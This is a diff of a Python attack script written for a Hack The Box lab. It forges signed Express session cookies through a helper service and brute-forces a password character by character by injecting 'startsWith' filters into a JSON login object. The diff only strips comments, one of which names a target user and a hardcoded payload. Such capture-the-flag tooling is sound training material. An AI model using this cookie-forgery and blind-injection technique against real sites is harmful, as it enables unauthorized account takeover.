@@ -4,8 +4,6 @@ import textwrap
 description=textwrap.dedent('''\
 Run this script alongside https://github.com/4wayhandshake/Express-Cookie-Signer.
 
-(Used for HTB box: "Download")
-
 1. This script generates JSON-like payloads, url-encodes them, and submits them
    to http://localhost:3000/auth/api for signing.
 2. localhost:3000 responds with the two forged cookies.
@@ -32,7 +30,6 @@ parser = argparse.ArgumentParser(
 parser.add_argument('target', help='The URL of the target, Ex. "http://attack-me.htb/login/")', type=str)
 parser.add_argument('test_object',
     help='a JSON-like object containing the FUZZ keyword, Ex. \'{"username":"admin", "password":FUZZ}\'', type=str)
-# This is a false-by-default boolean flag:
 parser.add_argument('--hex-only', action="store_true", dest="hex_only", help='Use hexadecimal characters only')
 parser.add_argument('--verbose', action="store_true", dest="verbose", help='Print each request')
 parser.add_argument('--contains', dest="does_contain", help='a "successful" attempt must contain this string.', type=str)
@@ -64,7 +61,6 @@ def testTarget(cookies):
 def success(result):
     ''' Return True if the payload was "successful" '''
     (status, num_lines, body) = result
-    #return (status == 200) and ('Hey WESLEY' in body) and ('No files found' not in body)
     if status != 200:
         return False
     if (args.does_contain is not None) and (args.does_contain not in body):
@@ -80,7 +76,6 @@ def outputLine(s):
 def testWorker(known, c):
     global known_password
     test = args.test_object.replace('FUZZ', f'{known}{c}')
-    #test = '{ "user": { "id": 1, "username": "WESLEY", "password":{"startsWith":"%s%s"}}, "flashes": { "info": [], "error": [], "success": [ "You are now logged in." ] } }' % (known, c)
     cookies = submitJsonForSigning2(test)
     result = testTarget(cookies)
     if success(result):
